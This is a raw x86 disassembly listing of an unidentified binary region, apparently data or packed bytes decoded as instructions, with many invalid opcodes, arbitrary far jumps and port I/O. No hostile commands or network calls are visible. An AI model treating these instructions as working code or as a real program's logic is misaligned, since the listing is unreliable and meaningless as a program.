  4098b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b3:	mov    al,0x48
  4098b5:	pushf  
  4098b6:	in     eax,dx
  4098b7:	sbb    DWORD PTR [edx-0x76],ebp
  4098ba:	xchg   ebp,eax
  4098bb:	mov    ds:0xd195b7c2,eax
  4098c0:	xlat   BYTE PTR ds:[ebx]
  4098c1:	pop    esp
  4098c2:	xor    DWORD PTR [ecx+edi*1+0x48],0x39
  4098c7:	jle    0x409909
  4098c9:	pop    ss
  4098ca:	in     al,0x77
  4098cc:	sbb    esp,ebx
  4098ce:	or     dh,dl
  4098d0:	fld    QWORD PTR [ebx+0x20]
  4098d3:	mov    ds:0x86d16a04,eax
  4098d8:	pop    ds
  4098d9:	(bad)  
  4098da:	jno    0x40986f
  4098dc:	jno    0x4098e1
  4098de:	adc    ch,BYTE PTR [edx-0x3e306f3]
  4098e4:	mov    esp,0xaf0f45ae
  4098e9:	bound  edx,QWORD PTR [edi-0x63b5826]
  4098ef:	cdq    
  4098f0:	test   eax,0x9b56b5fb
  4098f5:	(bad)  
  4098f6:	jg     0x4098b6
  4098f8:	push   es
  4098f9:	out    0x18,eax
  4098fb:	ret    0x557e
  4098fe:	jmp    0xdd3758f6
  409903:	(bad)  
  409904:	sbb    esp,DWORD PTR [ecx+0x1d843487]
  40990a:	pop    ebp
  40990b:	xor    ebp,DWORD PTR [ebp+esi*4+0x20]
  40990f:	push   eax
  409910:	mov    eax,ds:0xcd9e9f53
  409915:	repnz cmp eax,0x455ed8d5
  40991b:	mov    ebx,0x484c64d4
  409920:	push   cs
  409921:	call   0xb66a:0xa6225cc
  409928:	pop    esp
  409929:	xor    al,0xc4
  40992b:	jg     0x4098b1
  40992d:	pop    ss
  40992e:	dec    esp
  40992f:	dec    ecx
  409930:	xlat   BYTE PTR ds:[ebx]
  409931:	inc    ebp
  409932:	and    bh,BYTE PTR [ebx+0x560ab82d]
  409938:	or     al,0xce
  40993a:	bound  edx,QWORD PTR [ebx+0x4411b226]
  409940:	add    eax,0xa559eea2
  409945:	push   ebp
  409946:	lds    eax,FWORD PTR [edx-0x483a296a]
  40994c:	jbe    0x409909
  40994e:	jbe    0x4098eb
  409950:	sub    eax,0x54b099e5
  409955:	pop    ecx
  409956:	push   eax
  409957:	call   0x977a:0x82c36119
  40995e:	cmp    BYTE PTR fs:[ebp-0x2563448f],cl
  409965:	mov    esi,0xb2a44de3
  40996a:	shr    DWORD PTR [esi],cl
  40996c:	dec    edi
  40996d:	adc    DWORD PTR [eax-0x47d52b1a],eax
  409973:	imul   edx,DWORD PTR [ebx+0x7f],0x44bed59
  40997a:	cmovae esi,DWORD PTR [ebx+eax*1+0x11]
  40997f:	pop    eax
  409980:	loopne 0x40997a
  409982:	jno    0x40998e
  409984:	pop    ebx
  409985:	mov    dh,0x18
  409987:	loopne 0x40993e
  409989:	cmp    eax,0xce9a8fae
  40998e:	mov    edi,0xc02a7f7c
  409993:	fwait
  409994:	stc    
  409995:	fs or  eax,0xf5137731
  40999b:	popf   
  40999c:	fcom   DWORD PTR [ebx+0x3c429ba]
  4099a2:	inc    edx
  4099a3:	fyl2x  
  4099a5:	mov    edx,0x57f8e93b
  4099aa:	adc    edi,esp
  4099ac:	sbb    BYTE PTR [edi-0x5],dh
  4099af:	rcr    BYTE PTR [esi+ebx*4],cl
  4099b2:	xchg   edx,eax
  4099b3:	imul   BYTE PTR [edi+0x2a]
  4099b6:	add    ebx,edx
  4099b8:	lock (bad) 
  4099ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099bb:	test   DWORD PTR ds:0xe3adf10,ebx
  4099c1:	jno    0x4099b4
  4099c3:	dec    esp
  4099c4:	or     al,0xbb
  4099c6:	arpl   WORD PTR [ebx-0x5d],cx
  4099c9:	and    cl,BYTE PTR [ebx+0x4d716742]
  4099cf:	(bad)  
  4099d0:	sti    
  4099d1:	gs xchg esi,eax
  4099d3:	push   esi
  4099d4:	sbb    ecx,DWORD PTR [ebp-0x65]
  4099d7:	(bad)  
  4099d8:	mov    cl,0xef
  4099da:	xchg   edi,eax
  4099db:	mov    esp,DWORD PTR [esi]
  4099dd:	and    ebp,ecx
  4099df:	mov    BYTE PTR [eax],bh
  4099e1:	adc    al,0x95
  4099e3:	fldcw  WORD PTR [eax+0x9]
  4099e6:	cmp    eax,0xd2d6f9c0
  4099eb:	sar    BYTE PTR [eax+0x41b559af],cl
  4099f1:	mov    DWORD PTR ss:[esi+esi*4],edi
  4099f5:	pop    ebp
  4099f6:	mov    eax,0x7d7c336e
  4099fb:	(bad)  
  4099fc:	out    0x49,al
  4099fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099ff:	imul   ecx,DWORD PTR [eax],0x45
  409a02:	out    dx,al
  409a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a04:	add    ecx,ebx
  409a06:	bnd jl 0x409a51
  409a09:	push   0x5a
  409a0b:	loop   0x409a84
  409a0d:	jae    0x409a26
  409a0f:	cmp    ebx,DWORD PTR [ebp-0x575752bd]
  409a15:	je     0x4099ee
  409a17:	pop    es
  409a18:	(bad)  
  409a19:	mov    esi,0xc0d2b666
  409a1e:	in     eax,dx
  409a1f:	mov    edx,0xfbbb46b
  409a24:	je     0x409a7a
  409a26:	lods   al,BYTE PTR ds:[esi]
  409a27:	xchg   ebp,eax
  409a28:	daa    
  409a29:	mov    edx,0xd9046f60
  409a2e:	jecxz  0x409a66
  409a30:	jno    0x4099bb
  409a32:	mov    esi,eax
  409a34:	bound  eax,QWORD PTR [ebp-0x42]
  409a37:	ja     0x409ab0
  409a39:	dec    esi
  409a3a:	data16 test al,0xca
  409a3d:	sub    al,0x7b
  409a3f:	mov    ch,BYTE PTR [ecx-0x78c0d25b]
  409a45:	lods   al,BYTE PTR ds:[esi]
  409a46:	mov    eax,0xa01bf307
  409a4b:	cs pop ds
  409a4d:	mov    edi,0x741457ee
  409a52:	pop    esi
  409a53:	sar    BYTE PTR [edx-0x13],1
  409a56:	jmp    0x5ac8:0xd68b8914
  409a5d:	or     esp,DWORD PTR [ebx]
  409a5f:	jns    0x409ab8
  409a61:	jae    0x409a35
  409a63:	xchg   esp,eax
  409a64:	cmp    al,0x89
  409a66:	aad    0x45
  409a68:	(bad)  
  409a69:	sbb    DWORD PTR [ebx+0x1f],edi
  409a6c:	fisttp QWORD PTR [ecx+0x69]
  409a6f:	add    BYTE PTR [eax],0x90
  409a72:	loop   0x409adf
  409a74:	adc    esp,ebp
  409a76:	scas   al,BYTE PTR es:[edi]
  409a77:	rcr    eax,1
  409a79:	cwde   
  409a7a:	fidiv  WORD PTR [eax+edx*4+0x2137ea16]
  409a81:	shr    bh,cl
  409a83:	scas   eax,DWORD PTR es:[edi]
  409a84:	inc    ebp
  409a85:	jmp    0x409ae4
  409a87:	adc    bl,bl
  409a89:	iret   
  409a8a:	lea    eax,[edx]
  409a8c:	jp     0x409aaf
  409a8e:	gs dec ecx
  409a90:	mov    al,0x4b
  409a92:	mov    dl,bh
  409a94:	xchg   ebx,eax
  409a95:	test   BYTE PTR [esi+0x32],al
  409a98:	xor    edi,DWORD PTR [eax-0x2e]
  409a9b:	xor    al,0x43
  409a9d:	popf   
  409a9e:	or     bh,bh
  409aa0:	clc    
  409aa1:	push   ds
  409aa2:	repz adc BYTE PTR [eax-0x440ac3a6],dl
  409aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aaa:	call   0xf490:0x6693af34
  409ab1:	or     esp,edi
  409ab3:	push   es
  409ab4:	inc    ebx
  409ab5:	std    
  409ab6:	(bad)  
  409ab7:	ror    BYTE PTR [ebp-0x5],1
  409aba:	jle    0x409ae2
  409abc:	sti    
  409abd:	stos   BYTE PTR es:[edi],al
  409abe:	pop    esp
  409abf:	sub    esp,DWORD PTR [esi]
  409ac1:	inc    ecx
  409ac2:	sub    al,0xf3
  409ac4:	dec    esi
  409ac5:	mov    cl,0x4d
  409ac7:	enter  0xf3f7,0x7
  409acb:	pop    ebx
  409acc:	and    bh,BYTE PTR [edx+edi*2+0x604673]
  409ad3:	mov    ch,0x5a
  409ad5:	mov    DWORD PTR [edx+0x69],eax
  409ad8:	cli    
  409ad9:	outs   dx,DWORD PTR ds:[esi]
  409ada:	div    BYTE PTR [ebx-0x5c]
  409add:	clc    
  409ade:	inc    ecx
  409adf:	cdq    
  409ae0:	cmp    al,0xbe
  409ae2:	adc    DWORD PTR [ecx],0xf09867da
  409ae8:	mov    dh,0xab
  409aea:	jns    0x409b2b
  409aec:	stos   DWORD PTR es:[edi],eax
  409aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aee:	data16 add bl,ch
  409af1:	out    dx,eax
  409af2:	xor    cl,bh
  409af4:	pop    esi
  409af5:	mov    dh,0x8b
  409af7:	add    esi,DWORD PTR [eax]
  409af9:	mov    dl,0x7b
  409afb:	in     al,0x57
  409afd:	pop    eax
  409afe:	xlat   BYTE PTR ds:[ebx]
  409aff:	es retf 
  409b01:	mov    ebp,cr4
  409b04:	dec    ecx
  409b05:	(bad)  
  409b06:	sub    DWORD PTR es:[ecx+ecx*2],eax
  409b0a:	int    0x1d
  409b0c:	or     DWORD PTR [edi+0x57],ebp
  409b0f:	push   es
  409b10:	fcmovnb st,st(6)
  409b12:	outs   dx,DWORD PTR ds:[esi]
  409b13:	cwde   
  409b14:	in     eax,dx
  409b15:	add    DWORD PTR [eax],0x1c
  409b18:	dec    BYTE PTR [edi-0x5c06f2d0]
  409b1e:	push   cs
  409b1f:	das    
  409b20:	lds    ebp,FWORD PTR [esi+0x1c75d02b]
  409b26:	mov    ch,0x7e
  409b28:	test   eax,0x77db9463
  409b2d:	jp     0x409b77
  409b2f:	daa    
  409b30:	iret   
  409b31:	lea    ebx,[ecx+0xdba9241]
  409b37:	in     eax,0xb0
  409b39:	test   al,0x6a
  409b3b:	push   eax
  409b3c:	jle    0x409b1c
  409b3e:	dec    ebp
  409b3f:	push   esp
  409b40:	adc    dl,BYTE PTR [ebp+0xc]
  409b43:	and    ch,al
  409b45:	(bad)  
  409b46:	imul   DWORD PTR [edx+esi*4]
  409b49:	(bad)  
  409b4a:	outs   dx,BYTE PTR ds:[esi]
  409b4b:	jle    0x409b51
  409b4d:	shr    BYTE PTR [ebx+0x3bffbf27],1
  409b53:	aaa    
  409b54:	lea    esp,ds:0xa00e8000
  409b5a:	jmp    0x352ec1a9
  409b5f:	shl    DWORD PTR [edi],1
  409b61:	test   eax,0x2394434e
  409b66:	adc    bh,BYTE PTR [ecx]
  409b68:	xor    esi,DWORD PTR [eax-0x5a0fa3a8]
  409b6e:	xor    BYTE PTR [ecx],0x2d
  409b71:	jmp    0xdad3f4ca
  409b76:	mov    edi,0xc788249e
  409b7b:	add    eax,0xa51d9238
  409b80:	outs   dx,BYTE PTR ds:[esi]
  409b81:	in     al,dx
  409b82:	jo     0x409b6c
  409b84:	jne    0x409bcf
  409b86:	xchg   esp,eax
  409b87:	imul   DWORD PTR [ecx-0x18420b96]
  409b8d:	paddsb mm4,QWORD PTR [edx+0x62a97b00]
  409b94:	inc    eax
  409b95:	xchg   esp,eax
  409b96:	push   edx
  409b97:	jge    0x409bfc
  409b99:	fidiv  WORD PTR [edx-0x1f84dd49]
  409b9f:	sub    BYTE PTR [eax],bl
  409ba1:	aaa    
  409ba2:	or     al,0x97
  409ba4:	cmp    dl,BYTE PTR [eax-0x7a28bea7]
  409baa:	dec    esp
  409bab:	sti    
  409bac:	xchg   BYTE PTR [edx+esi*2-0x7dd0b596],dh
  409bb3:	mov    al,0xa5
  409bb5:	cmp    al,0xd1
  409bb7:	imul   ecx,DWORD PTR [esi],0xfe4de5a1
  409bbd:	adc    eax,0x109cd26f
  409bc2:	and    eax,0xf01e94dc
  409bc7:	jmp    0x409bb1
  409bc9:	in     eax,dx
  409bca:	das    
  409bcb:	xchg   ebp,eax
  409bcc:	and    ebx,eax
  409bce:	dec    esp
  409bcf:	sbb    esp,DWORD PTR [esi+eax*4+0x37]
  409bd3:	loop   0x409bdc
  409bd5:	(bad)  
  409bd6:	mov    ebx,0xa13290b6
  409bdb:	gs int 0x3a
  409bde:	clc    
  409bdf:	and    eax,0x2848be96
  409be4:	(bad)  
  409be6:	test   al,0xe0
  409be8:	fstp   QWORD PTR [ebx+0x663973ca]
  409bee:	lea    ebp,[eax-0x1b]
  409bf1:	call   0xf1620ff7
  409bf6:	outs   dx,DWORD PTR ds:[esi]
  409bf7:	aas    
  409bf8:	stos   DWORD PTR es:[edi],eax
  409bf9:	lods   eax,DWORD PTR ds:[esi]
  409bfa:	arpl   WORD PTR [esi-0x2a01ce48],dx
  409c00:	sbb    edi,DWORD PTR [esi-0x47e1c957]
  409c06:	mov    esp,0x69287fe3
  409c0b:	(bad)  
  409c0c:	mov    bl,0x63
  409c0e:	test   DWORD PTR [ebp+0x7],esp
  409c11:	(bad)  
  409c12:	jnp    0x409baf
  409c14:	int3   
  409c15:	imul   edi,DWORD PTR [ecx-0x74],0xe598e79f
  409c1c:	adc    dh,BYTE PTR [ebp+0xf]
  409c1f:	cmp    al,0x3d
  409c21:	sbb    BYTE PTR [edx],al
  409c23:	mov    esi,0xeb420855
  409c28:	call   0x54:0x3209d351
  409c2f:	mov    ah,0xb
  409c31:	je     0x409bc3
  409c33:	jnp    0x409c79
  409c35:	mov    dl,0xb4
  409c37:	sub    eax,0xad64cd7b
  409c3c:	pop    ebp
  409c3d:	imul   edi,DWORD PTR [eax-0x6a],0x7
  409c41:	in     al,0x42
  409c43:	arpl   WORD PTR ds:0x44e5a156,bp
  409c49:	pop    es
  409c4a:	push   cs
  409c4b:	xor    BYTE PTR [ebx],cl
  409c4d:	fidiv  DWORD PTR [edx+0x73]
  409c50:	jmp    0x409ccf
  409c52:	and    eax,0xa59c0ef4
  409c57:	js     0x409ccb
  409c59:	stos   DWORD PTR es:[edi],eax
  409c5a:	mov    BYTE PTR [esi+0x5f],al
  409c5d:	mul    BYTE PTR [ecx-0x1fe4e675]
  409c63:	cmc    
  409c64:	xchg   esp,eax
  409c65:	xchg   ecx,eax
  409c66:	mov    cs,WORD PTR [ecx]
  409c68:	sub    ecx,DWORD PTR [eax]
  409c6a:	data16 jno 0x409c57
  409c6d:	test   BYTE PTR [edi-0x12570674],bh
  409c73:	mov    eax,0xd00c1e97
  409c78:	add    DWORD PTR [edi-0x1cc7ceac],edi
  409c7e:	popf   
  409c7f:	aaa    
  409c80:	sub    DWORD PTR [ebx+0x46],eax
  409c83:	bound  ebp,QWORD PTR [ebx]
  409c85:	inc    edx
  409c86:	arpl   WORD PTR [esi-0x28bb3da4],dx
  409c8c:	sbb    bh,dl
  409c8e:	push   cs
  409c8f:	repz sbb dl,BYTE PTR [ebx+0x652fee2e]
  409c96:	ins    DWORD PTR es:[edi],dx
  409c97:	fsubr  QWORD PTR [edx-0x8d296fd]
  409c9d:	int3   
  409c9e:	dec    eax
  409c9f:	nop
  409ca0:	mov    DWORD PTR [ebp+0x1d],ecx
  409ca3:	push   es
  409ca4:	(bad)  
  409ca5:	out    dx,al
  409ca6:	push   0xffffffdf
  409ca8:	fdivr  QWORD PTR [ecx+0x7e]
  409cab:	and    dh,bl
  409cad:	lods   eax,DWORD PTR ds:[esi]
  409cae:	or     eax,0x78e86393
  409cb3:	sbb    eax,0x566e8d4c
  409cb8:	dec    edi
  409cb9:	mov    ebx,0x2e0bafe4
  409cbe:	pusha  
  409cbf:	sub    dl,BYTE PTR [edi-0x39]
  409cc2:	mov    edi,DWORD PTR [edx*8-0x7265f2e3]
  409cc9:	jl     0x409c5b
  409ccb:	sbb    ah,0xb9
  409cce:	pop    edx
  409ccf:	jmp    0x409cdf
  409cd1:	mov    edi,0x4d156220
  409cd6:	mov    dl,0x72
  409cd8:	push   0x3f8220c5
  409cdd:	adc    esp,DWORD PTR [edx]
  409cdf:	push   0x64cbdae6
  409ce4:	cdq    
  409ce5:	inc    ecx
  409ce6:	mov    eax,0xa0692c87
  409ceb:	shl    BYTE PTR [esi-0x4ba48cf0],1
  409cf1:	sbb    al,0xd6
  409cf3:	pop    edx
  409cf4:	ins    DWORD PTR es:[edi],dx
  409cf5:	(bad)  
  409cf6:	leave  
  409cf7:	ins    BYTE PTR es:[edi],dx
  409cf8:	dec    ebx
  409cf9:	mov    ecx,es
  409cfb:	mov    eax,ds:0x5770dda0
  409d00:	dec    esi
  409d01:	pop    edi
  409d02:	mov    DWORD PTR [edx+0x73f97700],esp
  409d08:	add    DWORD PTR [eax+0x6d6e7b8f],ebx
  409d0e:	ins    BYTE PTR es:[edi],dx
  409d0f:	dec    esp
  409d10:	jb     0x409ccd
  409d12:	shr    cl,0x23
  409d15:	in     eax,dx
  409d16:	icebp  
  409d17:	pop    esi
  409d18:	pop    ecx
  409d19:	pop    ebp
  409d1a:	(bad)  
  409d1b:	cmp    BYTE PTR [eax+0x496b111f],bl
  409d21:	and    dh,cl
  409d23:	popf   
  409d24:	cmp    eax,0xbea61a3a
  409d29:	iret   
  409d2a:	test   BYTE PTR [eax+0x13],ch
  409d2d:	in     eax,dx
  409d2e:	(bad)  
  409d2f:	pushf  
  409d30:	bound  esi,QWORD PTR [edx]
  409d32:	bound  ebp,QWORD PTR [edx+eiz*4-0x75]
  409d36:	lds    esp,FWORD PTR [edi+0x7f]
  409d39:	out    dx,eax
  409d3a:	ret    
  409d3b:	arpl   WORD PTR [edi],si
  409d3d:	std    
  409d3e:	js     0x409ccf
  409d40:	jecxz  0x409d7b
  409d42:	addr16 jno 0x409d93
  409d45:	shl    ebx,1
  409d47:	aas    
  409d48:	je     0x409d4a
  409d4a:	out    0x53,al
  409d4c:	sub    eax,0x1695840e
  409d51:	xchg   esi,eax
  409d52:	pop    esi
  409d53:	push   0xffffff83
  409d55:	push   esi
  409d56:	mov    esi,0x368d1a0c
  409d5b:	add    eax,ebx
  409d5d:	(bad)  
  409d5e:	pop    ebx
  409d5f:	ret    0x79d1
  409d62:	push   0x4a
  409d64:	outs   dx,BYTE PTR ds:[esi]
  409d65:	iret   
  409d66:	adc    DWORD PTR [esi+0x1f5ea1f5],eax
  409d6c:	sub    al,0x99
  409d6e:	call   0x275a:0x8eb17669
  409d75:	cmova  ebx,DWORD PTR [esi+0x48]
  409d79:	scas   eax,DWORD PTR es:[edi]
  409d7a:	aaa    
  409d7b:	sbb    esp,0x6c0349eb
  409d81:	int3   
  409d82:	mov    al,ds:0x4285efba
  409d87:	dec    esp
  409d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d89:	retf   
  409d8a:	or     al,0xc
  409d8c:	in     eax,0x56
  409d8e:	jmp    0x6433c7fe
  409d93:	push   esi
  409d94:	ror    BYTE PTR [ebx+edx*1-0x52],0x42
  409d99:	or     eax,0x8cd32c98
  409d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d9f:	cwde   
  409da0:	push   ebp
  409da1:	call   0x8e8b4913
  409da6:	adc    eax,0x7dc359bc
  409dab:	mov    ds:0xc90d1d70,al
  409db0:	(bad)  
  409db1:	out    0x7d,al
  409db3:	pop    ebx
  409db4:	pop    ds
  409db5:	xchg   ebx,eax
  409db6:	sbb    eax,0x482158b4
  409dbb:	mov    fs,esp
  409dbd:	repnz and DWORD PTR [edi-0x7d0c5879],ebx
  409dc4:	(bad)  
  409dc5:	jg     0x409da3
  409dc7:	xchg   ebx,eax
  409dc8:	adc    al,0xb
  409dca:	jle    0x409de2
  409dcc:	jns    0x409e2e
  409dce:	in     eax,0x7e
  409dd0:	loopne 0x409d6c
  409dd2:	xor    al,0xfb
  409dd4:	adc    eax,0xa18eda59
  409dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dda:	enter  0x9767,0xc4
  409dde:	stos   BYTE PTR es:[edi],al
  409ddf:	int3   
  409de0:	fwait
  409de1:	adc    BYTE PTR [ebx],cl
  409de3:	minps  xmm0,XMMWORD PTR [eax-0x3a]
  409de7:	push   ds
  409de8:	loopne 0x409e65
  409dea:	adc    BYTE PTR [ebx+0x6f770ccf],dh
  409df0:	loopne 0x409dba
  409df2:	pop    edx
  409df3:	cmp    eax,0x653e013d
  409df8:	stc    
  409df9:	call   0x61d666bd
  409dfe:	and    ch,ch
  409e00:	push   cs
  409e01:	adc    DWORD PTR [ecx+0x6c],ebp
  409e04:	inc    ebp
  409e05:	out    dx,al
  409e06:	bound  edx,QWORD PTR [eax-0x3318aed8]
  409e0c:	fistp  WORD PTR [esi-0x5676ae2a]
  409e12:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409e14:	dec    ebp
  409e15:	jo     0x409e6e
  409e17:	push   ebx
  409e18:	mov    edx,0x63d5a924
  409e1d:	fdivrp st(1),st
  409e1f:	in     eax,0x72
  409e21:	pop    ecx
  409e22:	repnz pop esp
  409e24:	and    ecx,0xffffffb6
  409e27:	cli    
  409e28:	test   BYTE PTR [ebp+0x1d],dl
  409e2b:	jmp    0xfdac87c1
  409e30:	outs   dx,BYTE PTR ds:[esi]
  409e31:	adc    BYTE PTR [ebx-0x3dccf8b6],ah
  409e37:	into   
  409e38:	dec    ebx
  409e39:	pop    eax
  409e3a:	scas   eax,DWORD PTR es:[edi]
  409e3b:	xchg   ebp,eax
  409e3c:	rcl    DWORD PTR [esi],0x16
  409e3f:	rcr    DWORD PTR [esi-0x5157091],cl
  409e45:	test   dh,bl
  409e47:	fnsave [ecx+ebx*1]
  409e4a:	loop   0x409e0c
  409e4c:	cmp    al,BYTE PTR [edi+ecx*1+0x58]
  409e50:	jg     0x409e16
  409e52:	dec    esi
  409e53:	pop    esp
  409e54:	mov    ?,WORD PTR [edi+esi*2]
  409e57:	das    
  409e58:	into   
  409e59:	mov    esp,0x670ad4a4
  409e5e:	jmp    0x409ea7
  409e60:	pop    ecx
  409e61:	dec    DWORD PTR [edi+esi*2+0x16]
  409e65:	das    
  409e66:	(bad)  
  409e67:	cmc    
  409e68:	je     0x409e4e
  409e6a:	in     al,dx
  409e6b:	gs fwait
  409e6d:	inc    ecx
  409e6e:	gs repz fwait
  409e71:	les    ecx,FWORD PTR [edx+0x49]
  409e74:	not    BYTE PTR [ebx-0x58]
  409e77:	enter  0xc64d,0x5a
  409e7b:	jbe    0x409ed6
  409e7d:	xchg   esi,eax
  409e7e:	push   eax
  409e7f:	rcl    DWORD PTR [edi-0x12a083fc],cl
  409e85:	xor    eax,0x28d7fc87
  409e8a:	and    al,0x76
  409e8c:	out    0x11,al
  409e8e:	mov    cl,ah
  409e90:	xchg   BYTE PTR [esi-0x5c3cbba8],al
  409e96:	mov    esi,DWORD PTR [esi+eax*4-0x3a]
  409e9a:	test   al,0x35
  409e9c:	stos   DWORD PTR es:[edi],eax
  409e9d:	jl     0x409e7b
  409e9f:	std    
  409ea0:	lods   eax,DWORD PTR ds:[esi]
  409ea1:	adc    al,0x2e
  409ea3:	leave  
  409ea4:	idiv   DWORD PTR [ecx+esi*8+0x7981de05]
  409eab:	lods   al,BYTE PTR ds:[esi]
  409eac:	js     0x409e60
  409eae:	xchg   BYTE PTR [ecx],dh
  409eb0:	test   eax,0xc554070d
  409eb5:	mov    ah,0x58
  409eb7:	call   0xc8f5677d
  409ebc:	or     bh,BYTE PTR [esp+edx*1-0x32]
  409ec0:	mov    ds:0xdf2d6e36,eax
  409ec5:	repz js 0x409f21
  409ec8:	in     al,0xff
  409eca:	mov    ebp,0x9455db7b
  409ecf:	pop    es
  409ed0:	mov    edx,0xdbee5d66
  409ed5:	inc    esp
  409ed6:	and    al,0x28
  409ed8:	aas    
  409ed9:	sbb    BYTE PTR [edx+0x13],bl
  409edc:	mov    dh,0xa
  409ede:	dec    ebx
  409edf:	inc    esp
  409ee0:	push   edi
  409ee1:	xlat   BYTE PTR ds:[ebx]
  409ee2:	mov    eax,0x13a9b426
  409ee7:	repnz nop
  409ee9:	lock cwde 
  409eeb:	(bad)  
  409eec:	sub    bh,BYTE PTR [ecx]
  409eee:	inc    edx
  409eef:	ret    0x7aff
  409ef2:	das    
  409ef3:	pop    ds
  409ef4:	pushf  
  409ef5:	jns    0x409e78
  409ef7:	xchg   BYTE PTR fs:[ecx-0x59],bl
  409efb:	xchg   ebp,eax
  409efd:	idiv   ch
  409eff:	jl     0x409f70
  409f01:	push   ss
  409f02:	mov    al,0xb6
  409f04:	sbb    esp,ecx
  409f06:	scas   al,BYTE PTR es:[edi]
  409f07:	sub    al,0xc1
  409f09:	jnp    0x409f4e
  409f0b:	push   ecx
  409f0c:	mov    gs,WORD PTR [ecx+ebp*1+0x25]
  409f10:	push   ebx
  409f11:	out    0xa6,al
  409f13:	cmp    eax,0x59a2baa0
  409f18:	push   ebp
  409f19:	add    al,0x76
  409f1b:	mov    dl,0x27
  409f1d:	push   eax
  409f1e:	(bad)  
  409f21:	push   edx
  409f22:	addr16 pop edx
  409f24:	daa    
  409f25:	inc    ecx
  409f26:	fdivr  QWORD PTR [edx-0x49402061]
  409f2c:	xchg   ebx,eax
  409f2d:	add    eax,0xdaea7f9e
  409f32:	xchg   DWORD PTR [ebp+0x38],edi
  409f35:	ficomp WORD PTR [edx+0x10]
  409f38:	add    bl,ch
  409f3a:	mov    bh,0x42
  409f3c:	xor    eax,0xe8ce5a03
  409f41:	repz xor ch,BYTE PTR [ebp+0x5bb0d94e]
  409f48:	sub    ebp,ebp
  409f4a:	popa   
  409f4b:	enter  0x234d,0x28
  409f4f:	and    edi,ecx
  409f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f52:	fnstsw WORD PTR [esi-0x50]
  409f55:	das    
  409f56:	mov    al,0x9d
  409f58:	in     eax,dx
  409f59:	and    esi,ecx
  409f5b:	shl    BYTE PTR [ebx+0x92deb15],0x7e
  409f62:	cdq    
  409f63:	mov    BYTE PTR [eax+0x32622900],0x7e
  409f6a:	pop    ebp
  409f6b:	aad    0xdf
  409f6d:	mov    edi,0x14193181
  409f72:	imul   esi,DWORD PTR [ebx+edi*8-0x10],0xffffff83
  409f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f78:	cmp    ch,BYTE PTR [ebp+0x1b465b74]
  409f7e:	xchg   esp,eax
  409f7f:	pop    edi
  409f80:	dec    eax
  409f81:	lea    ecx,ds:0x26f4b408
  409f87:	dec    eax
  409f88:	clc    
  409f89:	cwde   
  409f8a:	sbb    eax,0x8107817b
  409f8f:	mov    ebp,DWORD PTR [ecx-0x6068cf51]
  409f95:	lods   eax,DWORD PTR ds:[esi]
  409f96:	xor    al,0xce
  409f98:	adc    BYTE PTR [ebp-0x72f7ca58],0xf8
  409f9f:	jmp    0x8ce6:0x7f9da5d
  409fa6:	sti    
  409fa7:	push   0xffffffda
  409fa9:	cld    
  409faa:	sbb    BYTE PTR [ebx+ecx*8],ah
  409fad:	mov    al,ds:0x5fe29d1e
  409fb2:	and    BYTE PTR [edi+0x6e],dh
  409fb5:	xchg   esp,eax
  409fb6:	sbb    ah,BYTE PTR [ebp+0x68]
  409fb9:	inc    ebp
  409fba:	sub    dl,bh
  409fbc:	pop    ds
  409fbd:	jp     0x409f77
  409fbf:	and    DWORD PTR [ecx],0xa11699e1
  409fc5:	jbe    0x409f98
  409fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fc8:	fs imul eax
  409fcb:	jmp    0x18ce:0x54f9f648
  409fd2:	mov    ?,WORD PTR [edx+edx*4+0x181e47c5]
  409fd9:	pusha  
  409fda:	(bad)  
  409fdb:	sbb    eax,0x85d38a93
  409fe0:	mov    esp,cs
  409fe2:	xchg   esi,eax
  409fe3:	rdrand ecx
  409fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe7:	pop    esp
  409fe8:	jnp    0x40a054
  409fea:	xor    ch,dh
  409fec:	and    al,dh
  409fee:	adc    DWORD PTR [ebx+0x29d45061],eax
  409ff4:	adc    al,0x3f
  409ff6:	sub    al,0x84
  409ff8:	aaa    
  409ff9:	mov    al,ds:0x508965a2
  409ffe:	jge    0x40a051
  40a000:	test   BYTE PTR [ecx-0x79b2377c],ah
  40a006:	xchg   esp,eax
  40a007:	and    ebp,DWORD PTR [ecx+0x3cf6d3f7]
  40a00d:	fcmovnb st,st(6)
  40a00f:	jb     0x409fa0
  40a011:	xor    cl,BYTE PTR [ebx-0x6e]
  40a014:	gs inc ecx
  40a016:	fstp   TBYTE PTR [ecx-0x4cc84f40]
  40a01c:	sbb    ah,BYTE PTR [ebx+ebx*4]
  40a01f:	push   ds
  40a020:	out    dx,eax
  40a021:	jp     0x409fc1
  40a023:	xor    al,0xa4
  40a025:	mov    esp,0x1d749291
  40a02a:	int3   
  40a02b:	cmp    DWORD PTR [ebp+0x5a5906cd],edx
  40a031:	adc    eax,0x43b0770d
  40a036:	push   edx
  40a037:	lea    edi,[ecx+edx*2+0x47]
  40a03b:	adc    dh,cl
  40a03d:	inc    edx
  40a03e:	aam    0x24
  40a040:	mov    edx,0x17770b5e
  40a046:	sbb    ecx,edi
  40a048:	fcomp  st(2)
  40a04a:	out    0xd2,al
  40a04c:	dec    esp
  40a04d:	xor    cl,BYTE PTR [ebp+eax*4+0x5]
  40a051:	push   0xfffffff7
  40a053:	add    eax,0x6b995136
  40a058:	pop    ss
  40a059:	pop    ds
  40a05a:	lahf   
  40a05b:	pushf  
  40a05c:	inc    eax
  40a05e:	dec    edi
  40a05f:	cdq    
  40a060:	iret   
  40a061:	jo     0x40a0e0
  40a063:	pop    ss
  40a064:	hlt    
  40a065:	(bad)  
  40a066:	repz jl 0x40a006
  40a069:	call   DWORD PTR [edi-0x26095cf9]
  40a06f:	int    0xb7
